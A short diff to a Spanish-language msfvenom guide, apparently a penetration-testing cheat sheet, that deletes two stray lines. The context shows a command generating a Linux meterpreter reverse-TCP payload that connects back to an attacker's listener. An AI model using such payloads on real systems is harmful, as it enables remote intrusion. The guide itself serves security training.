@@ -5,10 +5,6 @@ Metasploit es un proyecto de código abierto para la seguridad informática, que
 Según la configuración del sistema de destino (sistema operativo, servidor web instalado, instalador intérprete, etc.), msfvenom se puede usar para crear cargas útiles en casi todos los formatos. A continuación hay algunos ejemplos que usará a menudo:
 En todos estos ejemplos, LHOST será la dirección IP de su máquina atacante y LPORT será el puerto en el que escuchará su controlador.
 
-LA
-
-hola
-
 **Linux Shell**
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
